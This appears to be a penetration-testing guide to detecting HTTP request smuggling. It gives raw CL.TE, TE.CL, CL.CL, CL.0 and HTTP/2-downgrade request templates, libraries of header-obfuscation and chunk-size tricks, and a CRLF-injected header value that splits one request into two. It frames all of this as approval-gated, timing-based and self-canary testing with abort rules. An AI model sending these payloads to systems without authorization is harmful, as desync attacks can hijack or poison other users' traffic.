# HTTP request-smuggling techniques (steps 2–3)
# Confirm SAFELY: timing detection first, then a self-canary that affects only YOUR next request.
# Never capture real-user traffic. Record in desync_tests.jsonl: {class, technique, timing_delta_ms, confirmed, method}.

## Classes
| Class | Front-end uses | Back-end uses |
|---|---|---|
| CL.TE | Content-Length | Transfer-Encoding |
| TE.CL | Transfer-Encoding | Content-Length |
| TE.TE | TE (one side obfuscated) | TE (other ignores) |
| CL.CL | duplicate Content-Length disagreement | — |
| H2.CL / H2.TE | HTTP/2 downgraded to HTTP/1.1 with CL/TE desync | — |

## Timing-based detection (safe, no victim)
A CL.TE / TE.CL mismatch makes the back-end wait for bytes that never come → a measurable delay.
`smuggler.py -u https://TARGET` automates the differential. Repeat to rule out noise.

## TE obfuscations to try
```
Transfer-Encoding: chunked
Transfer-Encoding : chunked        # space before colon
Transfer-Encoding: xchunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: x
```

## Self-canary confirmation (safe)
Send a smuggled prefix whose effect lands on YOUR OWN immediately-following request on the same
connection (e.g. prefix that makes your next request hit a different path / return a tell-tale
response). This proves desync without touching any other user. Burp Repeater "send group in sequence
(single connection)" or turbo-intruder.

## H2 downgrade
`h2csmuggler` / HTTP/2 → test `Content-Length`/`Transfer-Encoding` smuggling after front-end downgrade.

## Safety
Approval-gated. Timing + self-canary only. Confirm no persistent connection/queue poisoning remains;
if the target queues requests, STOP and report rather than risk other users.

---
## CL.TE / TE.CL — worked request templates

### CL.TE — front-end uses Content-Length, back-end uses Transfer-Encoding
The front-end forwards the whole body (per CL); the back-end stops at the `0\r\n\r\n` chunk terminator,
leaving your prefix queued for the NEXT request on that connection.
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
(`G` prepends to the next request → `GPOST …` = a tell-tale 404/405 on YOUR follow-up = desync.)

### TE.CL — front-end uses Transfer-Encoding, back-end uses Content-Length
Here the chunk-size line is **hex** and must equal the byte length of the smuggled block.
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 4
Transfer-Encoding: chunked

78
GET /404-canary HTTP/1.1
Host: TARGET
...pad so the block is exactly 0x78 = 120 bytes...

0

```
`78` (hex) = 120 (decimal): count every byte of your smuggled request block and set the chunk-size line
to its hex length, or the back-end mis-frames. Terminate with `0\r\n\r\n`.

**Byte-math reminder:** chunk size is hex; `\r\n` are 2 bytes each; off-by-one here is the #1 cause of a
"non-repro" desync. Keep the smuggled request a self-canary (hits a 404 path on your own next request).

---
## Extended arsenal — CL.CL and TE.TE (framing-disagreement deep dive)

### CL.CL — two Content-Length values disagree
Front-end honors one CL, back-end the other; the extra bytes become a prefix on the next request.
```
POST / HTTP/1.1
Host: HOST
Content-Length: 6
Content-Length: 5

12345A
```
One server reads 6 bytes, the other 5 → a 1-byte desync (`A` leads your next request). Many stacks reject
duplicate CL (good — no bug). Self-canary only: make the leftover byte turn YOUR next request into a
tell-tale 400/405.

### TE.TE — both use TE; one is fooled into ignoring it
Make exactly ONE server stop honoring `Transfer-Encoding` so it falls back to CL. Rotate the obfuscations
below until a timing or self-canary differential appears.

---
## Extended arsenal — header-mutation library (TE/CL obfuscations)

| Mutation | Example (escapes shown literally) |
|---|---|
| space before colon | `Transfer-Encoding : chunked` |
| tab before value | `Transfer-Encoding:\tchunked` |
| vertical-tab / form-feed prefix | `Transfer-Encoding:\x0bchunked` / `\x0cchunked` |
| no space after colon | `Transfer-Encoding:chunked` |
| trailing value junk | `Transfer-Encoding: chunked, identity` |
| bad token | `Transfer-Encoding: xchunked` / `chunkedx` |
| case | `Transfer-Encoding: Chunked` / `TRANSFER-ENCODING` |
| duplicate TE | `Transfer-Encoding: chunked` + `Transfer-Encoding: x` |
| TE↔CL reorder | put TE before/after CL to flip which server frames |
| line folding (obs-fold) | `Transfer-Encoding:` then next line ` chunked` |
| bare-LF line end | `Transfer-Encoding: chunked\n` (no CR) |
| duplicate CL | `Content-Length: 6` + `Content-Length: 5` |
| CL with sign/space/zeros | `Content-Length: +6` / ` 6` / `006` |
| bare-LF header separator | headers separated by `\n` only (front-end tolerant, back-end strict) |

Each row is a candidate for CL.TE / TE.CL / TE.TE / CL.CL. Confirm with timing first, then a self-canary.

---
## Extended arsenal — chunk-trick library
```
1;rs=canary\r\n...       # chunk extension (ignored by one parser, not the other)
00000078\r\n...          # leading-zero / overlong chunk size
7FFFFFFF\r\n...          # oversized size -> one side WAITS (timing signal). Do NOT send a huge body.
-1\r\n  /  0x78\r\n  /  78 \r\n   # negative / 0x-prefixed / trailing-space size (non-RFC)
0\r\nTrailer: x\r\n\r\n  # trailer fields after the terminating chunk
# Terminator placement is the #1 repro bug: the body ends EXACTLY at 0\r\n\r\n (5 bytes: 0 CR LF CR LF).
```
Keep any oversized-size probe to a TIMING signal (the server waits for bytes you never send); never ship a
real large body (that trends toward DoS). Abort if the socket is shared/queued.

---
## Extended arsenal — HTTP/2 desync (downgrade & tunnelling), safe confirmation
When a front-end speaks h2 to clients but h1 to the back-end, h2's exact framing is lost on downgrade.

| Class | Idea |
|---|---|
| h2.CL | smuggle a `content-length` h2 header that disagrees with the h2 frame length after downgrade |
| h2.TE | smuggle `transfer-encoding: chunked` as an h2 header; the back-end honors it post-downgrade |
| h2.0 / CRLF in pseudo-headers | inject `\r\n` into `:path`/`:authority`/a header value → request splitting on downgrade |
| h2 request tunnelling | over-long/duplicate h2 headers that reassemble into a second h1 request |

```
# Example idea (CRLF in an h2 header VALUE that becomes two h1 headers after downgrade):
#   "x-rs": "canary\r\nGET /rs-404-canary HTTP/1.1\r\nHost: HOST"
#   -> after downgrade, YOUR OWN next response flips to the canary path (self-only tell-tale).
```
Confirm the same way: a timing differential, then a self-canary that only alters YOUR follow-up. Drive any
h2-downgrade harness in self-canary mode only.

---
## Extended arsenal — CL.0 / 0.CL / request tunnelling (connection-scoped)
Some back-ends IGNORE `Content-Length` on certain endpoints (static files, redirects, some errors) → the
body is read as the start of the next request (CL.0). The mirror (front ignores CL) is 0.CL.
```
POST /static/any.js HTTP/1.1          # an endpoint where the back-end drops the body
Host: HOST
Content-Length: 34

GET /rs-404-canary HTTP/1.1
X-Ignore: x
```
Confirm with a self-canary on YOUR OWN next request over the same connection (single-connection send).
Catalogue, don't weaponize: these are connection-scoped and must never be aimed at shared traffic.

---
## Extended arsenal — detection methodology (precise, victimless)
1. **Baseline** a normal request's latency (N samples; note median + jitter).
2. **CL.TE probe**: a body shorter than CL claims → if the BACK-END uses TE it waits for the missing bytes
   → a measurable delay. **TE.CL probe**: the mirror. A reproducible delta clearly above jitter (averaged
   over ≥3 trials) signals desync.
3. **Differential-response** (optional, still self-scoped): a self-canary prefix makes YOUR OWN next request
   return a tell-tale (404/405/400). Never a prefix that could capture or alter another user's request, and
   never one that caches.
4. **Rule out noise**: retry; vary only the suspect header; compare against a known-clean control host.
Record `{class, technique, timing_delta_ms, confirmed, method}` per `desync_tests.jsonl`.

---
## Extended arsenal — safe self-canary patterns

| Pattern | Tell-tale on YOUR next request |
|---|---|
| prefix `G` (CL.TE) | `GPOST ...` → 400/405 |
| smuggle `GET /rs-404-canary` | your follow-up hits a 404 path |
| smuggle a bad method `ZZZ /` | 405/400 on your follow-up |
| prefix adds a header you then reflect | your own response echoes the canary header |

All of these land ONLY on the next request YOU send on the SAME connection (Repeater "send group in
sequence, single connection" / a single-connection script). None capture or modify another user's request.

---
## Extended arsenal — higher-risk classes (awareness) & abort conditions
Catalogued for completeness — confirm ONLY via timing/self-canary, NEVER weaponize:
- **client-side / browser-powered desync, pause-based desync**: front-end connection reuse can desync a
  victim's browser connection. Do not run victim-facing PoCs; note feasibility only.
- **queue / socket poisoning**: if a smuggled prefix would sit in a SHARED connection queue → STOP.

ABORT immediately and report (don't escalate) if you observe ANY of: responses not matching your requests;
a prefix persisting beyond your own next request; shared/pooled back-end connections; a load balancer that
queues; or any sign another client could be affected. Approval-gated, rate-limited, single-connection,
self-canary only. The finding is the desync primitive proven SAFELY — not any captured traffic or altered
victim request.
